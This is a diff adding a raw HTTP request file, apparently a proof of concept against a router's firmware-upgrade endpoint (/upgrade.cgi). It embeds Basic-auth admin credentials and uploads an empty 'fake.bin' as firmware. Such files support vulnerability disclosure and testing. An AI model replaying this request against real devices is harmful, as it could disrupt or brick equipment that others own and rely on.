@@ -1,0 +1,38 @@
+POST /upgrade.cgi HTTP/1.1
+Host: 192.169.1.1
+Content-Length: 587
+Cache-Control: max-age=0
+Authorization: Basic YWRtaW46JGt1cnQ=
+Upgrade-Insecure-Requests: 1
+Origin: http://192.169.1.1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryWkI1nBSltxk9VAcV
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://192.169.1.1/Upgrade.asp
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+------WebKitFormBoundaryWkI1nBSltxk9VAcV
+Content-Disposition: form-data; name="submit_button"
+
+Upgrade
+------WebKitFormBoundaryWkI1nBSltxk9VAcV
+Content-Disposition: form-data; name="change_action"
+
+
+------WebKitFormBoundaryWkI1nBSltxk9VAcV
+Content-Disposition: form-data; name="action"
+
+
+------WebKitFormBoundaryWkI1nBSltxk9VAcV
+Content-Disposition: form-data; name="file"; filename="fake.bin"
+Content-Type: application/macbinary
+
+
+------WebKitFormBoundaryWkI1nBSltxk9VAcV
+Content-Disposition: form-data; name="process"
+
+
+------WebKitFormBoundaryWkI1nBSltxk9VAcV--
+
